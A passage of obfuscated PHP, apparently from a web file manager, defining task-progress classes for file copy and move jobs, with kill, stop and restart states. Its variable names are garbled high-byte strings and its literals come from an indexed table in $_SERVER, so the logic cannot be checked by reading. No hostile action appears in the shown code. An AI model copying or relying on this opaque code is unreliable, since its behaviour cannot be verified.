$ÄË≤ë•¿[2473])) { continue; } if (!strstr($™äÓΩâ€[$ÄË≤ë•¿[498]], $ÄË≤ë•¿[2474])) { continue; } if (!$Ÿ≈¶Ï≤‹) { $Ÿ≈¶Ï≤‹ = $™äÓΩâ€; continue; } $‚Ê–›†≤ = explode($ÄË≤ë•¿[50], $Ÿ≈¶Ï≤‹[$ÄË≤ë•¿[498]]); $⁄≥Åäæê = explode($ÄË≤ë•¿[50], $™äÓΩâ€[$ÄË≤ë•¿[498]]); if (count($‚Ê–›†≤) > count($⁄≥Åäæê)) { $Ÿ≈¶Ï≤‹ = $™äÓΩâ€; } } return $Ÿ≈¶Ï≤‹ ? $Ÿ≈¶Ï≤‹[$ÄË≤ë•¿[486]] : $ÄË≤ë•¿[12]; } public function sort($Ä—ÿôöÇ, $≤⁄¥Ï˙≥) { return parent::update($Ä—ÿôöÇ, $≤⁄¥Ï˙≥); } } goto D¿‘êÕœ◊¶; FÑ®∞Ã–åŒ: class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\165\156\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($“˚–®Êå, $‘’Ñƒá¿ = '', $é™çû«ÿ = 0, $°ä¬ÀÛ· = '') { $±ñÆ¨˙· =& $_SERVER[ˆë€Ï⁄∂]; if (self::get($“˚–®Êå)) { return; } $this->task = array($±ñÆ¨˙·[486] => $“˚–®Êå, $±ñÆ¨˙·[1787] => USER_ID, $±ñÆ¨˙·[1675] => $°ä¬ÀÛ·, $±ñÆ¨˙·[537] => $±ñÆ¨˙·[12], $±ñÆ¨˙·[33] => $‘’Ñƒá¿, $±ñÆ¨˙·[1157] => $±ñÆ¨˙·[12], $±ñÆ¨˙·[1155] => $é™çû«ÿ, $±ñÆ¨˙·[1788] => 0, $±ñÆ¨˙·[1789] => 0, $±ñÆ¨˙·[1790] => 0, $±ñÆ¨˙·[1791] => timeFloat(), $±ñÆ¨˙·[1792] => 0, $±ñÆ¨˙·[1793] => 0, $±ñÆ¨˙·[1794] => 0, $±ñÆ¨˙·[1795] => 0, $±ñÆ¨˙·[841] => $±ñÆ¨˙·[1736]); $GLOBALS[$±ñÆ¨˙·[1796]] = 1; Hook::bind($±ñÆ¨˙·[1740], array($this, $±ñÆ¨˙·[1797])); Hook::bind($±ñÆ¨˙·[1798], array($this, $±ñÆ¨˙·[1799])); $this->startAfter(); Hook::trigger($±ñÆ¨˙·[1800], $this->task); $this->task[$±ñÆ¨˙·[1793]] = timeFloat(); } public function end($„„¶„÷≈ = '') { $™Ì—∂Ü“ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$™Ì—∂Ü“[1793]]) { self::valueSet($this->task[$™Ì—∂Ü“[486]], !1); } $this->isEnd = !0; if ($„„¶„÷≈) { $this->task[$™Ì—∂Ü“[537]] = $„„¶„÷≈; } self::log($™Ì—∂Ü“[1801] . $this->task[$™Ì—∂Ü“[486]] . $™Ì—∂Ü“[1802] . sprintf($™Ì—∂Ü“[943], timeFloat() - $this->task[$™Ì—∂Ü“[1791]]) . $™Ì—∂Ü“[1803]); Hook::unbind($™Ì—∂Ü“[1740], array($this, $™Ì—∂Ü“[1797])); Hook::unbind($™Ì—∂Ü“[1798], array($this, $™Ì—∂Ü“[1799])); $this->endAfter(); $ô∆◊•òñ = $this->task; $this->task = !1; Hook::trigger($™Ì—∂Ü“[1804], $ô∆◊•òñ); } public function update($Âêä¯æÅ = 0, $üÅÏØ„® = false) { $ä≠ïñ…Ù =& $_SERVER[ˆë€Ï⁄∂]; $¸¥˛À¢æ =& $this->task; if (!$¸¥˛À¢æ) { return; } $¸¥˛À¢æ[$ä≠ïñ…Ù[1788]] += $Âêä¯æÅ; $¸¥˛À¢æ[$ä≠ïñ…Ù[1792]] = timeFloat(); if ($¸¥˛À¢æ[$ä≠ïñ…Ù[1155]]) { if ($¸¥˛À¢æ[$ä≠ïñ…Ù[1155]] < $¸¥˛À¢æ[$ä≠ïñ…Ù[1788]]) { $¸¥˛À¢æ[$ä≠ïñ…Ù[1155]] = $¸¥˛À¢æ[$ä≠ïñ…Ù[1788]]; } $èöÃÃÃË = timeFloat() - $¸¥˛À¢æ[$ä≠ïñ…Ù[1791]] - $¸¥˛À¢æ[$ä≠ïñ…Ù[1794]]; if ($èöÃÃÃË <= 0) { $èöÃÃÃË = 0.001; } $¸¥˛À¢æ[$ä≠ïñ…Ù[1789]] = $¸¥˛À¢æ[$ä≠ïñ…Ù[1788]] / $¸¥˛À¢æ[$ä≠ïñ…Ù[1155]]; $¸¥˛À¢æ[$ä≠ïñ…Ù[1790]] = $¸¥˛À¢æ[$ä≠ïñ…Ù[1788]] / $èöÃÃÃË; if ($¸¥˛À¢æ[$ä≠ïñ…Ù[1789]] > 0) { $¸¥˛À¢æ[$ä≠ïñ…Ù[1795]] = $èöÃÃÃË * (1 - $¸¥˛À¢æ[$ä≠ïñ…Ù[1789]]) / $¸¥˛À¢æ[$ä≠ïñ…Ù[1789]]; } $¸¥˛À¢æ[$ä≠ïñ…Ù[1795]] = $¸¥˛À¢æ[$ä≠ïñ…Ù[1795]] <= 0 ? 0 : $¸¥˛À¢æ[$ä≠ïñ…Ù[1795]]; } $this->updateAfter(); $ﬂ–ÙõŒı = 0.2; if (timeFloat() - $¸¥˛À¢æ[$ä≠ïñ…Ù[1793]] < $ﬂ–ÙõŒı && !$üÅÏØ„®) { return; } $„Ò“∏≤⁄ = self::get($¸¥˛À¢æ[$ä≠ïñ…Ù[486]]); $¶öõØáÅ = $„Ò“∏≤⁄[$ä≠ïñ…Ù[841]]; if ($¶öõØáÅ == self::STATYS_KILL) { $Úù‹⁄≥è = array($ä≠ïñ…Ù[1805] => LNG($ä≠ïñ…Ù[1806]), $ä≠ïñ…Ù[1312] => !1); Cache::set($ä≠ïñ…Ù[1807] . $this->task[$ä≠ïñ…Ù[486]], $Úù‹⁄≥è, 30); $this->onKill(); $this->end(); die; } else { if ($¶öõØáÅ == self::STATYS_STOP) { $Ñ€ÌèƒÄ = 2; $„Ò“∏≤⁄[$ä≠ïñ…Ù[1794]] += $Ñ€ÌèƒÄ; self::valueSet($¸¥˛À¢æ[$ä≠ïñ…Ù[486]], $„Ò“∏≤⁄); sleep($Ñ€ÌèƒÄ); $this->update(); return; } } $¸¥˛À¢æ[$ä≠ïñ…Ù[841]] = $¶öõØáÅ ? $¶öõØáÅ : $¸¥˛À¢æ[$ä≠ïñ…Ù[841]]; $¸¥˛À¢æ[$ä≠ïñ…Ù[1794]] = $„Ò“∏≤⁄[$ä≠ïñ…Ù[1794]] ? $„Ò“∏≤⁄[$ä≠ïñ…Ù[1794]] : 0; $¸¥˛À¢æ[$ä≠ïñ…Ù[1793]] = timeFloat(); Hook::trigger($ä≠ïñ…Ù[1808], $¸¥˛À¢æ); self::valueSet($¸¥˛À¢æ[$ä≠ïñ…Ù[486]], $¸¥˛À¢æ); } public function onKillSet($ªüÏÖÔõ, $–Î˛£˛√ = array()) { $this->onKillCall = array($ªüÏÖÔõ, $–Î˛£˛√); } public function onKill() { $ÿì√†“Ù =& $_SERVER[ˆë€Ï⁄∂]; self::log($ÿì√†“Ù[1801] . $this->task[$ÿì√†“Ù[486]] . $ÿì√†“Ù[1809]); Hook::trigger($ÿì√†“Ù[1810], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($˛ãïÒãã) { $®ÿ¨ÈÂ =& $_SERVER[ˆë€Ï⁄∂]; Cache::set($®ÿ¨ÈÂ[1807] . $this->task[$®ÿ¨ÈÂ[486]], $˛ãïÒãã, 60); if (!is_array($˛ãïÒãã) || !$˛ãïÒãã[$®ÿ¨ÈÂ[1312]]) { self::log($®ÿ¨ÈÂ[1811] . json_encode($˛ãïÒãã)); } return $˛ãïÒãã; } public static function get($˝’£◊Üº) { $ò∞è´∫Ω =& $_SERVER[ˆë€Ï⁄∂]; $¢∏πêÛ— = self::valueGet($˝’£◊Üº); if (is_array($¢∏πêÛ—) && $¢∏πêÛ—[$ò∞è´∫Ω[1812]]) { $»Éªåı÷ = ActionApply($¢∏πêÛ—[$ò∞è´∫Ω[1812]], array($¢∏πêÛ—)); $¢∏πêÛ— = is_array($»Éªåı÷) ? $»Éªåı÷ : $¢∏πêÛ—; } return $¢∏πêÛ—; } public static function listData() { $ˆçÀŒ¬û = self::valueGet(); return array_sort_by($ˆçÀŒ¬û, $_SERVER[ˆë€Ï⁄∂][1791], !0); } public static function kill($Ï”◊óËÛ) { return self::changeStatus($Ï”◊óËÛ, self::STATYS_KILL); } public static function stop($≠çç‡‰…) { return self::changeStatus($≠çç‡‰…, self::STATYS_STOP); } public static function restart($ö€ÿ—•ª) { return self::changeStatus($ö€ÿ—•ª, self::STATYS_RUNNING); } public static function killAll() { $Í™»è¯≤ =& $_SERVER[ˆë€Ï⁄∂]; $—÷¢ÛÈ– = self::listData(); foreach ($—÷¢ÛÈ– as $‰ºà≥òÅ) { self::kill($‰ºà≥òÅ[$Í™»è¯≤[486]]); } sleep(2); foreach ($—÷¢ÛÈ– as $‰ºà≥òÅ) { self::valueSet($‰ºà≥òÅ[$Í™»è¯≤[486]], !1); } } private static function changeStatus($‹çæ¿≥á, $ñüŒ—‹) { $Ê‘°Á±√ =& $_SERVER[ˆë€Ï⁄∂]; $Ñ›†˙´” = self::valueGet($‹çæ¿≥á); if (!$Ñ›†˙´”) { return !1; } $Ñ›†˙´”[$Ê‘°Á±√[841]] = $ñüŒ—‹; self::valueSet($‹çæ¿≥á, $Ñ›†˙´”); self::log($Ê‘°Á±√[1813] . $Ñ›†˙´”[$Ê‘°Á±√[486]] . $Ê‘°Á±√[1814] . $ñüŒ—‹); return !0; } public static function valueGet($õ€∑≈–π = false) { $∑ÓèﬂÑÙ =& $_SERVER[ˆë€Ï⁄∂]; if ($õ€∑≈–π) { $ï≠‰ìƒÛ = Model($∑ÓèﬂÑÙ[531])->where(array($∑ÓèﬂÑÙ[107] => $õ€∑≈–π, $∑ÓèﬂÑÙ[33] => $∑ÓèﬂÑÙ[1164]))->find(); return $ï≠‰ìƒÛ ? json_decode($ï≠‰ìƒÛ[$∑ÓèﬂÑÙ[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ïÎõéá¸ = false) { $à£∏Ü«£ =& $_SERVER[ˆë€Ï⁄∂]; $òßíÇÖ∆ = array($à£∏Ü«£[33] => $à£∏Ü«£[1164]); if ($ïÎõéá¸) { $òßíÇÖ∆[$à£∏Ü«£[1787]] = $ïÎõéá¸; } $¸∏·ø¯Í = Model($à£∏Ü«£[531])->where($òßíÇÖ∆)->select(); $¸∏·ø¯Í = $¸∏·ø¯Í ? $¸∏·ø¯Í : array(); foreach ($¸∏·ø¯Í as $Œß°˙ﬁ∫ => $≠Ô¶ÀÃ) { $¸∏·ø¯Í[$Œß°˙ﬁ∫] = json_decode($≠Ô¶ÀÃ[$à£∏Ü«£[461]], !0); } return $¸∏·ø¯Í; } public static function valueSet($è•ìíÔ¶, $§˙û’ºÕ) { $Ë§üﬂ’ö =& $_SERVER[ˆë€Ï⁄∂]; if (!$§˙û’ºÕ) { return Model($Ë§üﬂ’ö[531])->where(array($Ë§üﬂ’ö[107] => $è•ìíÔ¶, $Ë§üﬂ’ö[33] => $Ë§üﬂ’ö[1164]))->delete(); } $ûòçΩ˙∏ = json_encode($§˙û’ºÕ); if (!$ûòçΩ˙∏) { ob_start(); var_dump($§˙û’ºÕ); $˝‘Öñ¢æ = ob_get_clean(); self::log($Ë§üﬂ’ö[1815] . json_encode_force($˝‘Öñ¢æ)); } if (!$è•ìíÔ¶ || !$§˙û’ºÕ[$Ë§üﬂ’ö[486]]) { return !1; } $üıÚ§ùÛ = array($Ë§üﬂ’ö[33] => $Ë§üﬂ’ö[1164], $Ë§üﬂ’ö[1787] => USER_ID, $Ë§üﬂ’ö[107] => $è•ìíÔ¶, $Ë§üﬂ’ö[461] => $ûòçΩ˙∏); $É∑ˆ‹ ⁄ = $Ë§üﬂ’ö[1816]; CacheLock::lock($É∑ˆ‹ ⁄); Model($Ë§üﬂ’ö[531])->add($üıÚ§ùÛ, array(), !0); CacheLock::unlock($É∑ˆ‹ ⁄); } public static function log($≥ﬂ≥À√è) { if (!GLOBAL_DEBUG) { return; } write_log($≥ﬂ≥À√è, $_SERVER[ˆë€Ï⁄∂][1817]); } } class TaskFileTransfer extends Task { protected function startAfter() { $§…ƒ˚ºÑ =& $_SERVER[ˆë€Ï⁄∂]; $Óˆ«±¸œ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($§…ƒ˚ºÑ[1818], array($this, $§…ƒ˚ºÑ[1819])); Hook::bind($§…ƒ˚ºÑ[1323], array($this, $§…ƒ˚ºÑ[1820])); Hook::bind($§…ƒ˚ºÑ[1821], array($this, $§…ƒ˚ºÑ[1822])); Hook::bind($§…ƒ˚ºÑ[682], array($this, $§…ƒ˚ºÑ[1823])); Hook::bind($§…ƒ˚ºÑ[683], array($this, $§…ƒ˚ºÑ[1824])); Hook::bind($§…ƒ˚ºÑ[689], array($this, $§…ƒ˚ºÑ[1825])); Hook::bind($§…ƒ˚ºÑ[690], array($this, $§…ƒ˚ºÑ[1826])); Hook::bind($§…ƒ˚ºÑ[685], array($this, $§…ƒ˚ºÑ[1827])); Hook::bind($§…ƒ˚ºÑ[687], array($this, $§…ƒ˚ºÑ[1828])); Hook::bind($§…ƒ˚ºÑ[651], array($this, $§…ƒ˚ºÑ[1829])); Hook::bind($§…ƒ˚ºÑ[648], array($this, $§…ƒ˚ºÑ[1829])); Hook::bind($§…ƒ˚ºÑ[653], array($this, $§…ƒ˚ºÑ[1829])); Hook::bind($§…ƒ˚ºÑ[655], array($this, $§…ƒ˚ºÑ[1829])); Hook::bind($§…ƒ˚ºÑ[657], array($this, $§…ƒ˚ºÑ[1829])); Hook::bind($§…ƒ˚ºÑ[1830], array($this, $§…ƒ˚ºÑ[1831])); Hook::bind($§…ƒ˚ºÑ[673], array($this, $§…ƒ˚ºÑ[1832])); $this->sourceModelCopyFlag = !1; Hook::bind($§…ƒ˚ºÑ[1833], array($this, $§…ƒ˚ºÑ[1834])); Hook::bind($§…ƒ˚ºÑ[1835], array($this, $§…ƒ˚ºÑ[1836])); Hook::bind($§…ƒ˚ºÑ[1837], array($this, $§…ƒ˚ºÑ[1838])); $Óˆ«±¸œ[$§…ƒ˚ºÑ[1839]] = LNG($§…ƒ˚ºÑ[1840]); $Óˆ«±¸œ[$§…ƒ˚ºÑ[1841]] = 0; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1842]] = 0; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1157]] = $§…ƒ˚ºÑ[12]; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1843]] = $§…ƒ˚ºÑ[12]; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1844]] = 0; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1845]] = 0; $Óˆ«±¸œ[$§…ƒ˚ºÑ[1846]] = 0; if (!$Óˆ«±¸œ[$§…ƒ˚ºÑ[1675]]) { $Óˆ«±¸œ[$§…ƒ˚ºÑ[1675]] = LNG($§…ƒ˚ºÑ[1847]); } } protected function endAfter() { $†·ˆ◊µ… =& $_SERVER[ˆë€Ï⁄∂]; Hook::unbind($†·ˆ◊µ…[1818], array($this, $†·ˆ◊µ…[1819])); Hook::unbind($†·ˆ◊µ…[1323], array($this, $†·ˆ◊µ…[1820])); Hook::unbind($†·ˆ◊µ…[1821], array($this, $†·ˆ◊µ…[1822])); Hook::unbind($†·ˆ◊µ…[682], array($this, $†·ˆ◊µ…[1823])); Hook::unbind($†·ˆ◊µ…[683], array($this, $†·ˆ◊µ…[1824])); Hook::unbind($†·ˆ◊µ…[689], array($this, $†·ˆ◊µ…[1825])); Hook::unbind($†·ˆ◊µ…[690], array($this, $†·ˆ◊µ…[1826])); Hook::unbind($†·ˆ◊µ…[685], array($this, $†·ˆ◊µ…[1827])); Hook::unbind($†·ˆ◊µ…[687], array($this, $†·ˆ◊µ…[1828])); Hook::unbind($†·ˆ◊µ…[651], array($this, $†·ˆ◊µ…[1829])); Hook::unbind($†·ˆ◊µ…[648], array($this, $†·ˆ◊µ…[1829])); Hook::unbind($†·ˆ◊µ…[653], array($this, $†·ˆ◊µ…[1829])); Hook::unbind($†·ˆ◊µ…[655], array($this, $†·ˆ◊µ…[1829])); Hook::unbind($†·ˆ◊µ…[657], array($this, $†·ˆ◊µ…[1829])); Hook::unbind($†·ˆ◊µ…[1830], array($this, $†·ˆ◊µ…[1831])); Hook::unbind($†·ˆ◊µ…[673], array($this, $†·ˆ◊µ…[1832])); Hook::unbind($†·ˆ◊µ…[1833], array($this, $†·ˆ◊µ…[1834])); Hook::unbind($†·ˆ◊µ…[1835], array($this, $†·ˆ◊µ…[1836])); Hook::unbind($†·ˆ◊µ…[1837], array($this, $†·ˆ◊µ…[1838])); } public function copyMoveStart($˘à∆…π†, $ŸŒüúáß, $ÿ∂¬»•Ê, $¬¥¬ÉÜØ) { $ûØÙâ£˝ =& $_SERVER[ˆë€Ï⁄∂]; self::log($ûØÙâ£˝[1848] . $ŸŒüúáß . $ûØÙâ£˝[83] . $¬¥¬ÉÜØ); $ÿ˝‚‡˜¨ = rtrim(TEMP_FILES, $ûØÙâ£˝[8]); if (substr($ŸŒüúáß, 0, strlen($ÿ˝‚‡˜¨)) == $ÿ˝‚‡˜¨) { return; } if (substr($¬¥¬ÉÜØ, 0, strlen($ÿ˝‚‡˜¨)) == $ÿ˝‚‡˜¨) { return; } $ …Ωˆå˛ =& $this->task; $ …Ωˆå˛[$ûØÙâ£˝[1849]] = KodIO::transferType($˘à∆…π†, $ÿ∂¬»•Ê); $this->update(); } public function updateAfter() { $”ÄíÌ˝— =& $_SERVER[ˆë€Ï⁄∂]; $ëëÑÃŒñ =& $this->task; if (!$ëëÑÃŒñ[$”ÄíÌ˝—[854]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ëëÑÃŒñ[$”ÄíÌ˝—[1849]] == $”ÄíÌ˝—[1417]) { return; } self::updateTask($ëëÑÃŒñ); } private static function updateTask(&$ÊîÔÅ»é) { $öÎΩ∂òè =& $_SERVER[ˆë€Ï⁄∂]; if ($ÊîÔÅ»é[$öÎΩ∂òè[1849]] == $öÎΩ∂òè[1294] || $ÊîÔÅ»é[$öÎΩ∂òè[1849]] == $öÎΩ∂òè[120]) { if ($ÊîÔÅ»é[$öÎΩ∂òè[1843]]) { $ÊîÔÅ»é[$öÎΩ∂òè[1846]] = $ÊîÔÅ»é[$öÎΩ∂òè[1845]] + $ÊîÔÅ»é[$öÎΩ∂òè[1842]]; } } else { if ($ÊîÔÅ»é[$öÎΩ∂òè[1849]] == $öÎΩ∂òè[1418]) { if ($ÊîÔÅ»é[$öÎΩ∂òè[1843]] == $öÎΩ∂òè[1294]) { $ÊîÔÅ»é[$öÎΩ∂òè[1846]] = $ÊîÔÅ»é[$öÎΩ∂òè[1845]] + $ÊîÔÅ»é[$öÎΩ∂òè[1842]] * 0.5; } else { if ($ÊîÔÅ»é[$öÎΩ∂òè[1843]] == $öÎΩ∂òè[120]) { $ÊîÔÅ»é[$öÎΩ∂òè[1846]] = $ÊîÔÅ»é[$öÎΩ∂òè[1845]] + $ÊîÔÅ»é[$öÎΩ∂òè[1841]] * 0.5 + $ÊîÔÅ»é[$öÎΩ∂òè[1842]] * 0.5; } } } } $ÊîÔÅ»é[$öÎΩ∂òè[1789]] = $ÊîÔÅ»é[$öÎΩ∂òè[1846]] / $ÊîÔÅ»é[$öÎΩ∂òè[854]]; if ($ÊîÔÅ»é[$öÎΩ∂òè[1789]] > 0) { $©ïï∏≈˜ = timeFloat() - $ÊîÔÅ»é[$öÎΩ∂òè[1791]] - $ÊîÔÅ»é[$öÎΩ∂òè[1794]]; $ÊîÔÅ»é[$öÎΩ∂òè[1795]] = $©ïï∏≈˜ * (1 - $ÊîÔÅ»é[$öÎΩ∂òè[1789]]) / $ÊîÔÅ»é[$öÎΩ∂òè[1789]]; } } public function addPath($ƒ»ûî’) { $¬˝áêÊŒ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ƒ»ûî’) { return; } $ﬁ¢õ≥¶Ö =& $this->task; $›°‹Ã≥Ê = IO::infoWithChildren($ƒ»ûî’); $ŒüäÜ∏µ = $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1850]] ? $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1850]][$¬˝áêÊŒ[1851]] : 0; $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1850]] = array($¬˝áêÊŒ[1851] => $ŒüäÜ∏µ + 1, $¬˝áêÊŒ[505] => $›°‹Ã≥Ê[$¬˝áêÊŒ[32]], $¬˝áêÊŒ[97] => $›°‹Ã≥Ê[$¬˝áêÊŒ[97]], $¬˝áêÊŒ[593] => $›°‹Ã≥Ê[$¬˝áêÊŒ[593]] ? $›°‹Ã≥Ê[$¬˝áêÊŒ[593]] : $›°‹Ã≥Ê[$¬˝áêÊŒ[97]]); if ($›°‹Ã≥Ê[$¬˝áêÊŒ[33]] == $¬˝áêÊŒ[242]) { $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1155]] += 1; } else { $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1155]] += $›°‹Ã≥Ê[$¬˝áêÊŒ[92]][$¬˝áêÊŒ[90]]; if ($›°‹Ã≥Ê[$¬˝áêÊŒ[203]]) { $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[1155]] += $›°‹Ã≥Ê[$¬˝áêÊŒ[92]][$¬˝áêÊŒ[91]] + 1; } } $ﬁ¢õ≥¶Ö[$¬˝áêÊŒ[854]] += $›°‹Ã≥Ê[$¬˝áêÊŒ[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ıèùÓîÄ) { } public function sourceAddHashEnd($√≥õúŒà) { } public function sourceAddFileStart($ê•≤ô˛£) { $⁄èè¿“à =& $_SERVER[ˆë€Ï⁄∂]; $˛ÕÙ“Œ… =& $this->task; $˛ÕÙ“Œ…[$⁄èè¿“à[1841]] = $ê•≤ô˛£[$⁄èè¿“à[89]]; $˛ÕÙ“Œ…[$⁄èè¿“à[1839]] = $ê•≤ô˛£[$⁄èè¿“à[32]]; $˛ÕÙ“Œ…[$⁄èè¿“à[1157]] = $ê•≤ô˛£[$⁄èè¿“à[32]]; $˛ÕÙ“Œ…[$⁄èè¿“à[1852]] = $ê•≤ô˛£[$⁄èè¿“à[97]]; $this->update(); } public function sourceAddFileEnd($≠ ±™ßﬁ) { $¯§¿æñë =& $_SERVER[ˆë€Ï⁄∂]; $˜‹Ê’¶∆ =& $this->task; $˜‹Ê’¶∆[$¯§¿æñë[1846]] += $≠ ±™ßﬁ[$¯§¿æñë[89]]; $˜‹Ê’¶∆[$¯§¿æñë[1852]] = $≠ ±™ßﬁ[$¯§¿æñë[97]]; $this->update(1); } public function copyFileStart($ñ„Ò§µÆ, $¡ﬁ∞ﬂôπ, $∆êÓÃ–…, $–à˙˘˜ú, $∆ ∏∞äÜ, $È∂Ï–´º) { $ë˛¨¥êÂ =& $_SERVER[ˆë€Ï⁄∂]; $Ì≈—µâı = $∆ ∏∞äÜ; if ($Ì≈—µâı == $GLOBALS[$ë˛¨¥êÂ[1853]]) { $Ì≈—µâı = $GLOBALS[$ë˛¨¥êÂ[1854]]; } $GLOBALS[$ë˛¨¥êÂ[1854]] = $∆ ∏∞äÜ; $GLOBALS[$ë˛¨¥êÂ[1853]] = $È∂Ï–´º; $Åø¥ä¿ =& $this->task; $Åø¥ä¿[$ë˛¨¥êÂ[1839]] = $Ì≈—µâı; $Åø¥ä¿[$ë˛¨¥êÂ[1841]] = (int) $ñ„Ò§µÆ->size($¡ﬁ∞ﬂôπ); $Åø¥ä¿[$ë˛¨¥êÂ[1842]] = 0; $Åø¥ä¿[$ë˛¨¥êÂ[1157]] = $ë˛¨¥êÂ[12]; $Åø¥ä¿[$ë˛¨¥êÂ[1843]] = $ë˛¨¥êÂ[12]; $Åø¥ä¿[$ë˛¨¥êÂ[1844]] = 0; $˚Ã“ëâÖ = $Åø¥ä¿[$ë˛¨¥êÂ[1841]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Åø¥ä¿[$ë˛¨¥êÂ[486]] . $ë˛¨¥êÂ[1855]); if ($˚Ã“ëâÖ && file_exists(get_path_father($–à˙˘˜ú))) { Cache::set($Åø¥ä¿[$ë˛¨¥êÂ[486]] . $ë˛¨¥êÂ[1855], $–à˙˘˜ú); $Åø¥ä¿[$ë˛¨¥êÂ[1812]] = array($ë˛¨¥êÂ[1856], $ë˛¨¥êÂ[1857]); } $this->update(0, $˚Ã“ëâÖ); } public static function updateCopyLocalFileSize($’ø≤ö¯†) { $ûëé–Ñ· =& $_SERVER[ˆë€Ï⁄∂]; $∞⁄í≈¥‡ = Cache::get($’ø≤ö¯†[$ûëé–Ñ·[486]] . $ûëé–Ñ·[1855]); if (!$∞⁄í≈¥‡ || !file_exists($∞⁄í≈¥‡)) { return $’ø≤ö¯†; } $’ø≤ö¯†[$ûëé–Ñ·[1842]] = @filesize($∞⁄í≈¥‡); $’ø≤ö¯†[$ûëé–Ñ·[1846]] += $’ø≤ö¯†[$ûëé–Ñ·[1842]]; self::updateTask($’ø≤ö¯†); return $’ø≤ö¯†; } public function copyFileEnd($¨Ü˝Ò›Â, $πƒ›Úºº, $öéÎÍ‡ı, $’≠√˝êÆ, $Æ¯õœÔ‘, $ÄèÇÊ±Æ) { $”∑«»‚† =& $_SERVER[ˆë€Ï⁄∂]; $ÜËı¨ë =& $this->task; $ÜËı¨ë[$”∑«»‚†[1842]] = $ÜËı¨ë[$”∑«»‚†[1841]]; $ÜËı¨ë[$”∑«»‚†[1843]] = $”∑«»‚†[12]; unset($ÜËı¨ë[$”∑«»‚†[1812]]); if ($Æ¯õœÔ‘ == $ÜËı¨ë[$”∑«»‚†[1839]]) { $ÜËı¨ë[$”∑«»‚†[1845]] += $ÜËı¨ë[$”∑«»‚†[1841]]; $ÜËı¨ë[$”∑«»‚†[1846]] = $ÜËı¨ë[$”∑«»‚†[1845]]; $£éã◊ñÉ = 1; if (isset($ÜËı¨ë[$”∑«»‚†[1852]]) && $ÜËı¨ë[$”∑«»‚†[1852]] == $πƒ›Úºº) { $£éã◊ñÉ = 0; } $this->update($£éã◊ñÉ); } else { $this->update(); $ÜËı¨ë[$”∑«»‚†[1842]] = 0; } Cache::remove($ÜËı¨ë[$”∑«»‚†[486]] . $”∑«»‚†[1855]); self::log($”∑«»‚†[1858] . $πƒ›Úºº . $”∑«»‚†[83] . $’≠√˝êÆ . $”∑«»‚†[59] . $Æ¯õœÔ‘ . $”∑«»‚†[1859] . $ÜËı¨ë[$”∑«»‚†[1839]]); } public function updateFileEnd($Ë∑ÆÂíø, $á…ï§ﬂƒ) { $⁄˘íåá =& $_SERVER[ˆë€Ï⁄∂]; $±é©≥Ù≠ =& $this->task; $±é©≥Ù≠[$⁄˘íåá[1839]] = $Ë∑ÆÂíø; $±é©≥Ù≠[$⁄˘íåá[1841]] = $á…ï§ﬂƒ; $±é©≥Ù≠[$⁄˘íåá[1845]] += $á…ï§ﬂƒ; $±é©≥Ù≠[$⁄˘íåá[1846]] = $±é©≥Ù≠[$⁄˘íåá[1845]]; $this->update(1); self::log($⁄˘íåá[1860] . $Ë∑ÆÂíø); } public function sourceModelCopy($æáâ‰¯µ) { $˙≠ÛÎÇÿ =& $_SERVER[ˆë€Ï⁄∂]; $÷“Õêï« = $æáâ‰¯µ[0]; $¨Ñ©àÒÉ = $æáâ‰¯µ[1]; $Ñõ˚ªÊÕ =& $this->task; $this->sourceModelCopyFlag = !0; $·ÿËÊå≤ = 0; switch ($÷“Õêï«) { case $˙≠ÛÎÇÿ[649]: $·ÿËÊå≤ = 1; break; case $˙≠ÛÎÇÿ[652]: $Ñõ˚ªÊÕ[$˙≠ÛÎÇÿ[1839]] = $¨Ñ©àÒÉ[$˙≠ÛÎÇÿ[32]]; break; case $˙≠ÛÎÇÿ[654]: $·ÿËÊå≤ = intval($æáâ‰¯µ[$˙≠ÛÎÇÿ[467]] * 0.4); break; case $˙≠ÛÎÇÿ[656]: $·ÿËÊå≤ = intval($æáâ‰¯µ[$˙≠ÛÎÇÿ[467]] * 0.2); break; case $˙≠ÛÎÇÿ[658]: $·ÿËÊå≤ = intval($æáâ‰¯µ[$˙≠ÛÎÇÿ[467]] * 0.4); break; } $this->update($·ÿËÊå≤); $this->sourceModelCopyFlag = !1; } public function sourceRemove($É€ˆó”é, $Ôï–†˘·) { $ÕÒ÷ﬁÏ± =& $_SERVER[ˆë€Ï⁄∂]; $this->sourceModelCopyFlag = !0; $îøç“Ò∑ = 1; if (isset($É€ˆó”é[$ÕÒ÷ﬁÏ±[92]])) { $îøç“Ò∑ = $É€ˆó”é[$ÕÒ÷ﬁÏ±[92]][$ÕÒ÷ﬁÏ±[90]]; $îøç“Ò∑ = $îøç“Ò∑ + $É€ˆó”é[$ÕÒ÷ﬁÏ±[92]][$ÕÒ÷ﬁÏ±[91]] + 1; } $this->update($îøç“Ò∑); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ä≈ÊÀ–‹) { $this->sourceRemove($Ä≈ÊÀ–‹, !1); } public function 